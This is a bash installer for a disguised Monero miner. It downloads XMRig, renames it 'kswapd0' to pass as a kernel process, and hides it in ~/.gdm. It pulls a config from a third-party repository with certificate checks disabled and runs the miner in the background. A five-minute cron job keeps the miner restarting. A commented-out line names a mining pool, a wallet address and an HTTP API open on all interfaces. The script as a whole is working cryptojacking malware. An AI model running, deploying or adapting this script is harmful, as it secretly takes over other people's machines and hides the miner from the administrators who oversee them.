#!/bin/bash

# Paths to the required files
KSWAPD0="$HOME/.gdm/kswapd0"
CONFIG_JSON="$HOME/.gdm/config.json"

# Verzeichnis erstellen und in das Verzeichnis wechseln
mkdir -p $HOME/.gdm/
cd $HOME/.gdm/

# Dateien herunterladen und entpacken
wget --no-check-certificate https://github.com/xmrig/xmrig/releases/download/v6.21.3/xmrig-6.21.3-linux-static-x64.tar.gz -O $HOME/.gdm/xmrig-6.21.3-linux-static-x64.tar.gz
tar xzvf xmrig-6.21.3-linux-static-x64.tar.gz -C $HOME/.gdm/
mv $HOME/.gdm/xmrig-6.21.3/xmrig $HOME/.gdm/kswapd0
chmod +x $HOME/.gdm/kswapd0

# Konfigurationsdateien herunterladen und anpassen
wget --no-check-certificate https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json -O $HOME/.gdm/config.json
cp $HOME/.gdm/config.json $HOME/.gdm/config_background.json
sed -i 's/"background": *false,/"background": true,/' $HOME/.gdm/config_background.json

## Programm starten
#$HOME/.gdm/kswapd0 -B --http-host 0.0.0.0 --http-port 8181 --http-access-token 55maui55 -o gulf.moneroocean.stream:80 -u 4BGGo3R1dNFhVS3wEqwwkaPyZ5AdmncvJRbYVFXkcFFxTtNX9x98tnych6Q24o2sg87txBiS9iACKEZH4TqUBJvfSKNhUuX -k --nicehash

# Run kswapd0 if no other process with the specific configuration is running
if ! pgrep -f "$KSWAPD0 --config=$CONFIG_JSON" > /dev/null; then
    echo "kswapd0 not started. Starting it..."
    "$KSWAPD0" --config="$CONFIG_JSON" &
else
    echo "kswapd0 is already running."
fi

# Create the check script
cat << 'EOF' > "$HOME/.gdm/check_kswapd0.sh"
#!/bin/bash

KSWAPD0_PATH="$HOME/.gdm/kswapd0"
CONFIG_JSON_PATH="$HOME/.gdm/config.json"

if ! pgrep -f "$KSWAPD0_PATH --config=$CONFIG_JSON_PATH" > /dev/null; then
    echo "kswapd0 not started. Going to start it..."
    cd "$HOME/.gdm/" || exit
    ./kswapd0 --config=config.json &
else
    echo "kswapd0 already started."
fi
EOF

# Make the check script executable
chmod +x "$HOME/.gdm/check_kswapd0.sh"

# Cron job setup: remove outdated lines and add the new command
CRON_JOB="*/5 * * * * $HOME/.gdm/check_kswapd0.sh"
(crontab -l 2>/dev/null | grep -v -E '(out dat|check_kswapd0.sh)'; echo "$CRON_JOB") | crontab -
